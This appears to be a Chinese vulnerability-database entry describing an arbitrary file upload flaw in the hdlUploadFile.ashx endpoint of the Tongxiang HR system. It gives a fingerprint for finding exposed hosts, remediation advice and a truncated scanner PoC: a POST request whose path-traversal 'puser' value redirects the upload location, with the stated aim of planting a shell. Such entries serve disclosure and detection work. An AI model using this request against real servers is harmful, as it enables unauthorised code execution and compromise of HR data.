# 同享人力系统hdlUploadFile接口存在任意文件上传漏洞

- **系统**：同享人力系统hdlUploadFile接口　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Assistant/Default.aspx"`
- **关键头**：`ID: 7798`　`Author: young15`　`Name: 同享人力系统hdlUploadFile接口存在任意文件上传`　`Description: 同享人力系统是东莞市同享软件科技有限公司研发的管理平台。该平台hdlUploadFile接口由于对上传的文件名字与后缀校验不足，导致攻击者可上传代码，修改上传路径达到getshell目的`　`DVB: DVB-2024-7798`

**请求体 / payload**
```
- 任意文件上传
Category:
- 应用服务
Manufacturer: 东莞市同享软件科技有限公司
Product: 同享人力系统
Type: 1
Status: 1
Scanable: 1
Level: 4
DisclosureDate: '2024-08-04'
Region: 中国大陆
Is0day: false
IncludeExp: true
Weakable: false
IsXc: false
IsCommon: false
IsCallBack: false
Condition: body="/Assistant/Default.aspx"
Solutions:
- 删除接口或做好校验
- 关注厂商发布更新升级到最新版本
poc:
relative: req0 && req1
session: false
requests:
- method: POST
timeout: 10
path: /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd
headers:
Gecko) Chrome/94.0.2558.72 Safari/537.36
follow_redirects: true
matches: code.eq("200")
files:
Filedata:
-…（脚本共 2280 字，完整版见原文）
```
- **预期**：200　|　—